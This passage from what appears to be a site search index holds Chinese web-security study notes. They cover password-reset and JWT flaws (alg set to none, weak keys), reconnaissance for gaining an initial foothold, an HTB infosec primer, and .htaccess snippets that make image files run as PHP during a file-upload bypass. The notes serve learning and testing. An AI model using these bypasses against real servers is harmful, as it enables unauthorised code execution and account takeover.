\u91cd\u7f6e\u51ed\u8bc1\u63a5\u6536\u7aef\u53ef\u7be1\u6539\u3001\u91cd\u7f6e\u51ed\u8bc1\u6cc4\u6f0f\u3001\u91cd\u7f6e\u51ed\u8bc1\u672a\u6821\u9a8c\u3001\u91cd\u7f6e\u51ed\u8bc1\u53ef\u7206\u7834\u3001\u7528\u6237\u6df7\u6dc6\u3001\u5e94\u7b54\u5b58\u5728\u5f71\u54cd\u540e\u7eed\u903b\u8f91\u7684\u72b6\u6001\u53c2\u6570\u3001token\u53ef\u9884\u6d4b</p> <p>\u62e6\u622a\u5bc6\u7801\u627e\u56de\u8bf7\u6c42 \u62e6\u622a\u5bc6\u7801\u627e\u56de\u8bf7\u6c42 -&gt; \u54cd\u5e94\u7528\u6237\u4e0d\u5b58\u5728 -&gt; \u91cd\u53d1 -&gt; \u7ed3\u679c\u76f8\u540c -&gt;\u66f4\u6539\u7528\u6237\u540d\u91cd\u53d1 -&gt; \u54cd\u5e94\u7528\u6237\u4e0d\u5b58\u5728 &gt;&gt; <code>\u7528\u6237\u540d\u53ef\u679a\u4e3e</code></p> <p>JSON\u6570\u636e \u6ce8\u610f\u662f\u5426\u542b\u6709\u654f\u611f\u4fe1\u606f </p> <p>\u903b\u8f91\u6f0f\u6d1e \u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5f15\u7528(IDOR) \u5bc6\u7801\u91cd\u7f6e\u8fc7\u7a0b\u4e2d \u5c06\u6536\u4ef6\u90ae\u7bb1\u66f4\u6539\u4e3a\u653b\u51fb\u8005\uff0c\u653b\u51fb\u8005\u4f1a\u6536\u5230\u91cd\u7f6e\u94fe\u63a5 \u8fbe\u5230 <code>\u4efb\u610f\u7528\u6237\u5bc6\u7801\u91cd\u7f6e\u6f0f\u6d1e</code></p> <pre><code>\u5b66\u5230 token \u7528\u4f5c\u8eab\u4efd\u51ed\u8bc1\uff0c\u4e0d\u4f1a\u4e0e\u540c\u6837\u529f\u80fd\u7684 cookie \u540c\u65f6\u5b58\u5728\uff1b\u53e6\u4e00\u79cd\u53ef\u80fd\u662f\u7528\u4e8e\u9632\u8303 CSRF\uff0c\u901a\u5e38\u4e3a16\u4f4d\u621632\u4f4d\u7684\u54c8\u5e0c\u503c\n</code></pre> <p>JWT\u7528\u4e8e\u66ff\u4ee3cookie\u8868\u793a\u7528\u6237\u8eab\u4efd\u51ed\u8bc1\u7684\u8f7d\u4f53\uff0c\u670d\u52a1\u7aef\u5b9e\u73b0\u4e0d\u597d\uff0c\u5bb9\u6613\u51fa\u73b0<code>\u5782\u76f4\u8d8a\u6743\u6f0f\u6d1e</code> JWT \u653b\u51fb\u624b\u6cd5\uff1a\u672a\u6821\u9a8c\u7b7e\u540d\u3001\u7981\u7528hash\u3001\u7206\u7834\u5f31\u5bc6\u94a5 \u672a\u6821\u9a8c\u7b7e\u540d \u5728\u670d\u52a1\u7aef\u672a\u6821\u9a8cJWT\u7b7e\u540d\u65f6\uff0c\u53ef\u5c1d\u8bd5\u4fee\u6539token\u540e\u76f4\u63a5\u53d1\u7ed9\u670d\u52a1\u7aef \u7981\u7528hash JWT\u5b57\u6bb5\u7b2c\u4e00\u90e8\u5206\u542b\u6709 alg \u5b57\u6bb5\uff0c\u8be5\u5b57\u6bb5\u6307\u5b9a\u751f\u6210\u7b7e\u540d\u91c7\u7528\u54ea\u79cdhash\u7b97\u6cd5\uff0c\u5c06\u5b57\u6bb5\u7be1\u6539\u4e3a none(JWT\u5927\u5c0f\u5199\u654f\u611f)\uff0c\u5c31\u4e0d\u518d\u751f\u6210hash\u7b7e\u540d  \u7206\u7834\u5f31\u5bc6\u94a5 </p> <p>\u6709\u5229\u4e8e\u5b57\u5178\u7ef4\u62a4\u7684\u76f8\u5173\u4fe1\u606f \u4e2d\u56fd\u4eba\u59d3\u540d\uff08top500\uff09 \u751f\u6210\u5b57\u5178 \u57fa\u7840\u4fe1\u606f\uff1a\u7528\u6237\u540d\u3001\u90ae\u7bb1\u3001\u51fa\u751f\u65e5\u671f\u3001</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%89%93%E7%82%B9/","title":"\u6253\u70b9","text":"<p>\u6253\u70b9 \u62ff\u5230 shell \u7684\u8fc7\u7a0b\uff0c\u76ee\u7684\u5728\u4e8e\u5229\u7528\u62ff\u5230\u7684\u6743\u9650\u505a\u4e00\u4e2a\u8df3\u677f\uff0c\u8fdb\u5165\u5185\u7f51\u3002 \u5927\u81f4\u6d41\u7a0b \u4fe1\u606f\u6536\u96c6 -&gt; \u627e\u5230\u8106\u5f31\u8d44\u4ea7 -&gt; \u6f0f\u6d1e\u5229\u7528 -&gt; getshell</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%89%93%E7%82%B9/#_1","title":"\u4fe1\u606f\u6536\u96c6\u5206\u7c7b","text":"<p>\u4f01\u4e1a\u4fe1\u606f\u7ed3\u6784\u6536\u96c6</p> <p>\u654f\u611f\u4fe1\u606f\u6536\u96c6</p> <p>\u57df\u540d\u4fe1\u606f\u6536\u96c6</p> <p>IP\u8d44\u4ea7\u4fe1\u606f</p> <p>\u626b\u63cf\u68c0\u6d4b\u6253\u70b9</p> <p>\u5f97\u5230\u653b\u51fb\u76ee\u6807 -&gt; \u516c\u53f8 -&gt; \u5b50\u516c\u53f8 \u641c\u5bfb\u57df\u540d -&gt; \u5b50\u57df\u540d \u89e3\u6790\u57df\u540d\u5f97\u5230\u5bf9\u5e94\u7684 IP \u548c C\u6bb5 \u4fe1\u606f \u626b\u63cf\u8d44\u4ea7\u4fe1\u606f -&gt; \u7aef\u53e3\u670d\u52a1 -&gt; \u6307\u7eb9\u8bc6\u522b -&gt; \u6f0f\u6d1e\u63a2\u6d4b </p> <p>\u6253\u70b9\u91cd\u70b9 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e SQL\u6ce8\u5165\u6f0f\u6d1e \u5f31\u53e3\u4ee4</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%89%93%E7%82%B9/#_2","title":"\u6253\u70b9\u7684\u5e38\u7528\u65b9\u5f0f","text":"<p>\u7cfb\u7edf\u6f0f\u6d1e \u9493\u9c7c \u8fd1\u6e90 \u7269\u7406 \u5185\u9b3c</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%8C%87%E5%8D%97/","title":"\u6307\u5357","text":"<p>Web\u5b89\u5168\u5b66\u4e60\u7b14\u8bb0        //\u7b80\u5355\u8fc7\u4e00\u904d\uff0c\u4e0d\u61c2\u95ee\u9898\u8bb0\u5f55\u4e0b\u6765</p> <p>OWASP Web Security Testing Guide  //\u7b2c\u56db\u7ae0\uff1aWEB\u6e17\u900f\u6d4b\u8bd5</p> <p>\u5907\u5fd8\u5f55</p> <p>hacktricks       //\u6e17\u900f\u6d4b\u8bd5\u7684\u5907\u5fd8\u5f55\uff0c\u5305\u62ecWEB\u6e17\u900f\u6d4b\u8bd5\uff0c\u5404\u79cd\u7aef\u53e3\u534f\u8bae\u6d4b\u8bd5\u65b9\u6cd5\u3002\u6f0f\u6d1e\u7b80\u4ecb\u3001\u6316\u6398\u65b9\u5f0f\u3001\u7ed5\u8fc7\u601d\u8def\u3001\u53c2\u8003\u6587\u7ae0         </p> <p>\u5b89\u5168\u77e5\u8bc6\u6846\u67b6</p> <p>\u6700\u91cd\u8981\u7684\u662f\u591a\u52a8\u624b</p> <p>hackthebox       //\u9776\u673a\u8d28\u91cf\u9ad8\uff0c\u6709\u65b0\u624b\u5b66\u4e60\u9879\u76ee</p> <p>hackthebox\u6559\u5b66\u6587\u7ae0    //\u4e0b\u6587\u4e3a\u5165\u95e8\u8bfe\u7a0b\u7b2c\u4e00\u8282</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%8C%87%E5%8D%97/#_1","title":"\u4fe1\u606f\u5b89\u5168\u6982\u8ff0","text":"<p>\u4fe1\u606f\u5b89\u5168\uff08infosec\uff09\u662f\u4e00\u4e2a\u5e7f\u9614\u7684\u9886\u57df\u3002\u5728\u8fc7\u53bb\u7684\u51e0\u5e74\u91cc\uff0c\u8be5\u9886\u57df\u5f97\u5230\u4e86\u5f88\u5927\u7684\u53d1\u5c55\u548c\u53d1\u5c55\u3002\u5b83\u63d0\u4f9b\u4e86\u8bb8\u591a\u4e13\u4e1a\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ul> <li>\u7f51\u7edc\u548c\u57fa\u7840\u8bbe\u65bd\u5b89\u5168</li> <li>\u5e94\u7528\u5b89\u5168</li> <li>\u5b89\u5168\u6d4b\u8bd5</li> <li>\u7cfb\u7edf\u5ba1\u8ba1</li> <li>\u4e1a\u52a1\u8fde\u7eed\u6027\u89c4\u5212</li> <li>\u6570\u5b57\u53d6\u8bc1</li> <li>\u4e8b\u4ef6\u68c0\u6d4b\u548c\u54cd\u5e94</li> </ul> <p>\u7b80\u800c\u8a00\u4e4b\uff0c\u4fe1\u606f\u5b89\u5168\u662f\u4fdd\u62a4\u6570\u636e\u514d\u906d\u672a\u7ecf\u6388\u6743\u7684\u8bbf\u95ee\u3001\u66f4\u6539\u3001\u975e\u6cd5\u4f7f\u7528\u3001\u4e2d\u65ad\u7b49\u7684\u505a\u6cd5\u3002\u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u4eba\u5458\u8fd8\u91c7\u53d6\u884c\u52a8\u51cf\u5c11\u4efb\u4f55\u6b64\u7c7b\u4e8b\u4ef6\u7684\u6574\u4f53\u5f71\u54cd\u3002</p> <p>\u6570\u636e\u53ef\u4ee5\u662f\u7535\u5b50\u7684\u6216\u7269\u7406\u7684\u548c\u6709\u5f62\u7684\uff08\u4f8b\u5982\uff0c\u8bbe\u8ba1\u84dd\u56fe\uff09\u6216\u65e0\u5f62\u7684\uff08\u77e5\u8bc6\uff09\u3002\u5728\u6211\u4eec\u7684\u4fe1\u606f\u5b89\u5168\u804c\u4e1a\u4e2d\u7ecf\u5e38\u51fa\u73b0\u7684\u4e00\u4e2a\u5e38\u89c1\u77ed\u8bed\u662f\u4fdd\u62a4\u201c\u6570\u636e\u7684\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u53ef\u7528\u6027\u201d\u6216<code>CIA triad</code>.</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%8C%87%E5%8D%97/#_2","title":"\u98ce\u9669\u7ba1\u7406\u6d41\u7a0b","text":"<p>\u6570\u636e\u4fdd\u62a4\u5fc5\u987b\u4e13\u6ce8\u4e8e\u9ad8\u6548\u800c\u6709\u6548\u7684\u7b56\u7565\u5b9e\u65bd\uff0c\u800c\u4e0d\u4f1a\u5bf9\u7ec4\u7ec7\u7684\u4e1a\u52a1\u8fd0\u8425\u548c\u751f\u4ea7\u529b\u4ea7\u751f\u8d1f\u9762\u5f71\u54cd\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff0c\u7ec4\u7ec7\u5fc5\u987b\u9075\u5faa\u4e00\u4e2a\u79f0\u4e3a<code>risk management process</code>. \u8fd9\u4e2a\u8fc7\u7a0b\u5305\u62ec\u4ee5\u4e0b\u4e94\u4e2a\u6b65\u9aa4\uff1a</p> \u6b65 \u89e3\u91ca <code>Identifying the Risk</code> \u8bc6\u522b\u4f01\u4e1a\u9762\u4e34\u7684\u98ce\u9669\uff0c\u4f8b\u5982\u6cd5\u5f8b\u3001\u73af\u5883\u3001\u5e02\u573a\u3001\u76d1\u7ba1\u548c\u5176\u4ed6\u7c7b\u578b\u7684\u98ce\u9669\u3002 <code>Analyze the Risk</code> \u5206\u6790\u98ce\u9669\u4ee5\u786e\u5b9a\u5176\u5f71\u54cd\u548c\u6982\u7387\u3002\u98ce\u9669\u5e94\u8be5\u6620\u5c04\u5230\u7ec4\u7ec7\u7684\u5404\u79cd\u653f\u7b56\u3001\u7a0b\u5e8f\u548c\u4e1a\u52a1\u6d41\u7a0b\u3002 <code>Evaluate the Risk</code> \u8bc4\u4f30\u3001\u6392\u5e8f\u548c\u786e\u5b9a\u98ce\u9669\u7684\u4f18\u5148\u7ea7\u3002\u7136\u540e\uff0c\u7ec4\u7ec7\u5fc5\u987b\u51b3\u5b9a\u63a5\u53d7\uff08\u4e0d\u53ef\u907f\u514d\uff09\u3001\u907f\u514d\uff08\u6539\u53d8\u8ba1\u5212\uff09\u3001\u63a7\u5236\uff08\u51cf\u8f7b\uff09\u6216\u8f6c\u79fb\u98ce\u9669\uff08\u4fdd\u9669\uff09\u3002 <code>Dealing with Risk</code> \u5c3d\u53ef\u80fd\u6d88\u9664\u6216\u63a7\u5236\u98ce\u9669\u3002\u8fd9\u662f\u901a\u8fc7\u76f4\u63a5\u4e0e\u98ce\u9669\u76f8\u5173\u7684\u7cfb\u7edf\u6216\u6d41\u7a0b\u7684\u5229\u76ca\u76f8\u5173\u8005\u8fdb\u884c\u4ea4\u4e92\u6765\u5904\u7406\u7684\u3002 <code>Monitoring Risk</code> \u5fc5\u987b\u4e0d\u65ad\u76d1\u6d4b\u6240\u6709\u98ce\u9669\u3002\u5e94\u4e0d\u65ad\u76d1\u63a7\u98ce\u9669\uff0c\u4ee5\u53d1\u73b0\u4efb\u4f55\u53ef\u80fd\u6539\u53d8\u5176\u5f71\u54cd\u8bc4\u5206\u7684\u60c5\u51b5\u53d8\u5316<code>i.e., from low to medium or high impact</code>\u3002 <p>\u5982\u524d\u6240\u8ff0\uff0c\u4fe1\u606f\u5b89\u5168\u7684\u6838\u5fc3\u539f\u5219\u662f\u4fe1\u606f\u4fdd\u969c\uff0c\u5373\u7ef4\u62a4<code>CIA</code>\u6570\u636e\u5e76\u786e\u4fdd\u5728\u4e8b\u4ef6\u53d1\u751f\u65f6\u4e0d\u4f1a\u4ee5\u4efb\u4f55\u65b9\u5f0f\u3001\u5f62\u72b6\u6216\u5f62\u5f0f\u53d7\u5230\u635f\u5bb3\u3002\u4e8b\u4ef6\u53ef\u80fd\u662f\u81ea\u7136\u707e\u5bb3\u3001\u7cfb\u7edf\u6545\u969c\u6216\u5b89\u5168\u4e8b\u4ef6\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%8C%87%E5%8D%97/#_3","title":"\u7ea2\u961f\u4e0e\u84dd\u961f","text":"<p>\u5728\u4fe1\u606f\u5b89\u5168\u4e2d\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u542c\u5230\u672f\u8bed<code>red team</code>\u548c<code>blue team</code>. \u7528\u6700\u7b80\u5355\u7684\u8bdd\u6765\u8bf4\uff0c<code>red team</code>\u653b\u51fb\u8005\u626e\u6f14\u653b\u51fb\u8005\u7684\u89d2\u8272\uff0c\u800c<code>blue team</code>\u9632\u5fa1\u8005\u626e\u6f14\u9632\u5fa1\u8005\u7684\u89d2\u8272\u3002</p> <p>\u7ea2\u961f\u961f\u5458\u901a\u5e38\u5728\u95ef\u5165\u7ec4\u7ec7\u4e2d\u626e\u6f14\u5bf9\u624b\u89d2\u8272\uff0c\u4ee5\u8bc6\u522b\u771f\u6b63\u7684\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528\u6765\u7834\u574f\u7ec4\u7ec7\u9632\u5fa1\u7684\u4efb\u4f55\u6f5c\u5728\u5f31\u70b9\u3002\u7ea2\u961f\u65b9\u9762\u6700\u5e38\u89c1\u7684\u4efb\u52a1\u662f\u6e17\u900f\u6d4b\u8bd5\u3001\u793e\u4f1a\u5de5\u7a0b\u548c\u5176\u4ed6\u7c7b\u4f3c\u7684\u653b\u51fb\u6027\u6280\u672f\u3002</p> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u84dd\u961f\u5360\u4fe1\u606f\u5b89\u5168\u5de5\u4f5c\u7684\u5927\u90e8\u5206\u3002\u5b83\u8d1f\u8d23\u901a\u8fc7\u5206\u6790\u98ce\u9669\u3001\u5236\u5b9a\u7b56\u7565\u3001\u54cd\u5e94\u5a01\u80c1\u548c\u4e8b\u4ef6\u4ee5\u53ca\u6709\u6548\u4f7f\u7528\u5b89\u5168\u5de5\u5177\u548c\u5176\u4ed6\u7c7b\u4f3c\u4efb\u52a1\u6765\u52a0\u5f3a\u7ec4\u7ec7\u7684\u9632\u5fa1\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%8C%87%E5%8D%97/#_4","title":"\u6e17\u900f\u6d4b\u8bd5\u5458\u7684\u89d2\u8272","text":"<p>\u5b89\u5168\u8bc4\u4f30\u5458\uff08\u7f51\u7edc\u6e17\u900f\u6d4b\u8bd5\u5458\u3001Web \u5e94\u7528\u7a0b\u5e8f\u6e17\u900f\u6d4b\u8bd5\u5458\u3001\u7ea2\u961f\u7b49\uff09\u5e2e\u52a9\u7ec4\u7ec7\u8bc6\u522b\u5176\u5916\u90e8\u548c\u5185\u90e8\u7f51\u7edc\u4e2d\u7684\u98ce\u9669\u3002\u8fd9\u4e9b\u98ce\u9669\u53ef\u80fd\u5305\u62ec\u7f51\u7edc\u6216 Web \u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\u3001\u654f\u611f\u6570\u636e\u66b4\u9732\u3001\u914d\u7f6e\u9519\u8bef\u6216\u53ef\u80fd\u5bfc\u81f4\u58f0\u8a89\u53d7\u635f\u7684\u95ee\u9898\u3002\u4f18\u79c0\u7684\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4e0e\u5ba2\u6237\u4e00\u8d77\u8bc6\u522b\u5176\u7ec4\u7ec7\u9762\u4e34\u7684\u98ce\u9669\uff0c\u63d0\u4f9b\u6709\u5173\u5982\u4f55\u91cd\u73b0\u8fd9\u4e9b\u98ce\u9669\u7684\u4fe1\u606f\uff0c\u5e76\u5c31\u5982\u4f55\u51cf\u8f7b\u6216\u8865\u6551\u6d4b\u8bd5\u671f\u95f4\u53d1\u73b0\u7684\u95ee\u9898\u63d0\u4f9b\u6307\u5bfc\u3002</p> <p>\u8bc4\u4f30\u53ef\u4ee5\u91c7\u53d6\u591a\u79cd\u5f62\u5f0f\uff0c\u4ece\u9488\u5bf9\u6240\u6709\u8303\u56f4\u5185\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u767d\u76d2\u6e17\u900f\u6d4b\u8bd5\u4ee5\u8bc6\u522b\u5c3d\u53ef\u80fd\u591a\u7684\u6f0f\u6d1e\uff0c\u5230\u7f51\u7edc\u9493\u9c7c\u8bc4\u4f30\u4ee5\u8bc4\u4f30\u98ce\u9669\u6216\u5458\u5de5\u7684\u5b89\u5168\u610f\u8bc6\uff0c\u518d\u5230\u56f4\u7ed5\u7ea2\u961f\u8fdb\u884c\u6709\u9488\u5bf9\u6027\u7684\u8bc4\u4f30\u6a21\u62df\u73b0\u5b9e\u4e16\u754c\u5a01\u80c1\u884c\u4e3a\u8005\u7684\u573a\u666f\u3002</p> <p>\u6211\u4eec\u5fc5\u987b\u4e86\u89e3\u7ec4\u7ec7\u9762\u4e34\u7684\u98ce\u9669\u53ca\u5176\u73af\u5883\u7684\u5927\u5c40\uff0c\u624d\u80fd\u51c6\u786e\u8bc4\u4f30\u548c\u8bc4\u4f30\u5728\u6d4b\u8bd5\u671f\u95f4\u53d1\u73b0\u7684\u6f0f\u6d1e\u3002\u6df1\u5165\u4e86\u89e3\u98ce\u9669\u7ba1\u7406\u6d41\u7a0b\u5bf9\u4e8e\u4efb\u4f55\u5f00\u59cb\u4ece\u4e8b\u4fe1\u606f\u5b89\u5168\u5de5\u4f5c\u7684\u4eba\u6765\u8bf4\u90fd\u662f\u81f3\u5173\u91cd\u8981\u7684\u3002</p> <p>\u672c\u6a21\u5757\u5c06\u91cd\u70b9\u4ecb\u7ecd\u5982\u4f55\u4ece\u52a8\u624b\u7684\u89d2\u5ea6\u5f00\u59cb\u4fe1\u606f\u5b89\u5168\u548c\u6e17\u900f\u6d4b\u8bd5\uff0c\u7279\u522b\u662f\u9009\u62e9\u548c\u5bfc\u822a\u6e17\u900f\u6d4b\u8bd5\u53d1\u884c\u7248\uff0c\u5b66\u4e60\u5e38\u7528\u6280\u672f\u548c\u57fa\u672c\u5de5\u5177\uff0c\u5b66\u4e60\u6e17\u900f\u6d4b\u8bd5\u7684\u6c34\u5e73\u548c\u57fa\u7840\u77e5\u8bc6\uff0c\u7834\u89e3\u6211\u4eec\u7684\u7b2c\u4e00\u4e2aHTB \u4e0a\u7684 box\uff0c\u5982\u4f55\u6700\u6709\u6548\u5730\u67e5\u627e\u548c\u5bfb\u6c42\u5e2e\u52a9\uff0c\u5e38\u89c1\u7684\u6f5c\u5728\u95ee\u9898\uff0c\u4ee5\u53ca\u5982\u4f55\u6d4f\u89c8 Hack the Box \u5e73\u53f0\u3002</p> <p>\u867d\u7136\u672c\u6a21\u5757\u4f7f\u7528 Hack The Box \u5e73\u53f0\u548c\u6545\u610f\u6613\u53d7\u653b\u51fb\u7684\u673a\u5668\u4f5c\u4e3a\u793a\u4f8b\uff0c\u4f46\u5c55\u793a\u7684\u57fa\u672c\u6280\u80fd\u9002\u7528\u4e8e\u4efb\u4f55\u73af\u5883\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"\u6587\u4ef6\u4e0a\u4f20","text":"<p>Apache .htaccess\u914d\u7f6e\u6587\u4ef6\u7ed5\u8fc7 <code>.htaccess</code>\u662f\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u3002\u5b83\u53ef\u4ee5\u7528\u6765\u63a7\u5236\u6240\u5728\u76ee\u5f55\u7684\u8bbf\u95ee\u6743\u9650\u4ee5\u53ca\u89e3\u6790\u8bbe\u7f6e\u3002\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8be5\u6587\u4ef6\u7684\u914d\u7f6e\u9879\uff0c\u5c06\u8be5\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u4f5c\u4e3aphp\u6587\u4ef6\u6765\u89e3\u6790\u3002</p> <p>\u7ed5\u8fc7\u65b9\u6cd5\uff1a\u9996\u5148\u4e0a\u4f20\u4e00\u4e2a<code>.htaccess</code>\u6587\u4ef6\uff0c<code>.htaccess</code>\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\u3002\u5982\u679cApache\u5141\u8bb8<code>.htaccess</code>\u6587\u4ef6\u751f\u6548\uff0c\u5e76\u4e14<code>.htaccess</code>\u6587\u4ef6\u6ca1\u6709\u88ab\u91cd\u547d\u540d\u3002\u90a3\u4e48\u5c31\u53ef\u4ee5\u6539\u53d8\u5f53\u524d\u76ee\u5f55\u4ee5\u53ca\u5b50\u76ee\u5f55\u7684Apache\u914d\u7f6e\u4fe1\u606f\uff0c\u5c06\u5176\u4ed6\u540e\u7f00\u7684\u6587\u4ef6\u4f5c\u4e3aPHP\u6587\u4ef6\u89e3\u6790\u3002</p> <p>\u670d\u52a1\u7aef\u5141\u8bb8<code>.htaccess</code>\u6587\u4ef6\u751f\u6548\uff0c\u9700\u8981\u5728<code>httpd.conf</code>\u4e2d\uff0c\u4fee\u6539\u4e24\u5904\u914d\u7f6e\u9879\uff1a</p> <ul> <li> <p>Apache\u52a0\u8f7drewrite\u6a21\u5757</p> <p><code>LoadModule rewrite_module modules/mod_rewrite.so</code></p> </li> <li> <p><code>AllowOverride All</code>\uff08\u9ed8\u8ba4\u4e3aNone\uff09</p> </li> </ul> <p><code>.htaccess</code>\u6587\u4ef6\u4e2d\u6709\u4e24\u79cd\u5199\u6cd5</p> <pre><code>&lt;FilesMatch \"xxx.png\"&gt;\nSetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n</code></pre> <p>xxx.png\u5373\u53ef\u4f5c\u4e3aphp\u811a\u672c\u89e3\u6790</p> <p>\u6216\u8005\u662f</p> <pre><code>AddType application/x-httpd-php .gif\n</code></pre> <p>.gif\u4e3a\u540e\u7f00\u989d\u5ea6\u6587\u4ef6\u90fd\u5f53\u505aphp\u89e3\u6790</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","title":"\u6e17\u900f\u6d4b\u8bd5","text":"<p>\u6e17\u900f\u6d4b\u8bd5\u6d41\u7a0b \u5165\u95e8 \u6f0f\u6d1e\u8bc4\u4f30 \u70ae\u5f39\u548c\u6709\u6548\u8f7d\u8377 \u4f7f\u7528metasploit\u6846\u67b6 \u8db3\u8ff9 nmap\u7f51\u7edc\u679a\u4e3e \u653b\u51fb\u516c\u5171\u670d\u52a1 \u4f7f\u7528\u7f51\u7edc\u4ee3\u7406 \u767b\u9646\u66b4\u529b\u7834\u89e3 \u4f7f\u7528ffuf\u653b\u51fbweb\u5e94\u7528\u7a0b\u5e8f</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#sdfa","title":"sdfa","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95-%E6%80%9D%E8%B7%AF%E7%AF%87/","title":"\u6e17\u900f\u6d4b\u8bd5\u9762\u8bd5 \u601d\u8def\u7bc7","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95-%E6%80%9D%E8%B7%AF%E7%AF%87/#_1","title":"\u8bf4\u4e00\u4e0b\u4f60\u7684\u6e17\u900f\u6d4b\u8bd5\u601d\u8def","text":"<p>\u4fe1\u606f\u6536\u96c6 \u6f0f\u6d1e\u6316\u6398 \u6f0f\u6d1e\u5229\u7528 \u540e\u6e17\u900f \u6743\u9650\u7ef4\u6301 \u6e05\u9664\u65e5\u5fd7 \u751f\u6210\u62a5\u544a</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95-%E6%80%9D%E8%B7%AF%E7%AF%87/#_2","title":"\u5185\u7f51\u6e17\u900f","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95-%E6%80%9D%E8%B7%AF%E7%AF%87/#shell","title":"\u5047\u5982\u4f60\u62ff\u5230\u4e86Shell\uff0c\u5982\u4f55\u53d1\u73b0\u57df\u63a7\u4e3b\u673a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95-%E6%80%9D%E8%B7%AF%E7%AF%87/#shell_1","title":"\u83b7\u53d6shell\u7684\u65b9\u6cd5\u4f60\u77e5\u9053\u7684\u6709\u54ea\u4e9b","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95-%E6%80%9D%E8%B7%AF%E7%AF%87/#shell_2","title":"\u62ff\u5230Shell\u540e\u7684\u4e0b\u4e00\u6b65\u600e\u4e48\u505a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%E5%A4%96%E7%BD%91%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95%26%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/","title":"\u7ea2\u961f\u653b\u9632\u2014\u2014\u5916\u7f51\u5feb\u901f\u6253\u70b9\u65b9\u6cd5&\u6280\u5de7\u603b\u7ed3","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%E5%A4%96%E7%BD%91%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95%26%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#_1","title":"\u7ea2\u961f\u653b\u9632\u2014\u2014\u5916\u7f51\u5feb\u901f\u6253\u70b9\u65b9\u6cd5&amp;\u6280\u5de7\u603b\u7ed3","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%E5%A4%96%E7%BD%91%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95%26%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#_2","title":"\u5927\u4f6c\u6559\u5b66\u601d\u8def","text":"<p>\u9ed1\u5ba2\u6280\u672f\u00a02022-07-11</p> <p>630</p> <p>\u4e00\u3001\u6253\u70b9\u7684\u57fa\u672c\u8ba4\u8bc6</p> <p>\u505a\u8fc7\u7ea2\u961f\u7684\u5c0f\u4f19\u4f34\uff0c\u5bf9\u6253\u70b9\u4e00\u5b9a\u4e0d\u964c\u751f\uff0c\u8fd9\u662f\u4e00\u9879\u57fa\u672c\u6280\u80fd\u3002\u6240\u8c13\u6253\u70b9\uff0c\u5c31\u662f\u62ff\u5230\u4e00\u53f0\u673a\u5668\u7684shell\u3002</p> 